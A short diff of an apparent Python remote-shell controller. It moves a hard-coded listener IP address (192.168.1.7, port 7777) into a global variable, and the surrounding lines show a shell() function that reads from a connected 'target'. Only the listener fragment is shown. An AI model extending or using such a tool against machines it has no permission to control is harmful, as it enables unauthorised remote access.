@@ -4,6 +4,9 @@
 import socket
 import base64
 
+global ipadd
+ipadd = "192.168.1.7"
+
 def shell():
     current_dir = target.recv(1024)
     count = 0
@@ -62,7 +65,7 @@ def upserver():
 
     server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
-    server.bind(('192.168.1.7',7777))
+    server.bind((ipadd,7777))
     server.listen(1)
 
     print("Servidor corriendo y esperando conexiones...")
